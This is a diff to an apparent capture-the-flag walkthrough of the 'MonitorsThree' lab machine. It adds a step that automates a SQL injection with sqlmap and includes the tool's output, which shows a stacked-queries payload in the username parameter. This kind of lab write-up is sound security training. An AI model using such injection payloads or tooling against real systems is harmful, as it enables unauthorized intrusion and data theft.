@@ -256,7 +256,7 @@ Yes! Our query was injected successfully!
 
 Now we are going to automate the exploitation with `sqlmap`, because `error-based` injections can take a lot of time if we decised to exploit it manually.
 
-To do it we will save to a file the request with `Burp Suite`:
+To do it we will copy to a file the request with `Burp Suite`:
 
 <br />
 
@@ -265,5 +265,45 @@ To do it we will save to a file the request with `Burp Suite`:
 <br />
 
 ![11](../../../assets/images/MonitorsThree/11.png)
+
+<br />
+
+At this point, we can pass the file to `sqlmap` and find the injection:
+
+<br />
+
+```bash
+❯ sqlmap -r request --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.12#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:40:15 /2025-04-26/
+
+[20:40:15] [INFO] parsing HTTP request from 'request'
+[20:40:16] [INFO] resuming back-end DBMS 'mysql' 
+[20:40:16] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: username=admin';SELECT SLEEP(5)#
+---
+[20:40:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[20:40:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/monitorsthree.htb'
+
+[*] ending @ 20:40:16 /2025-04-26/
+```
 
 <br />
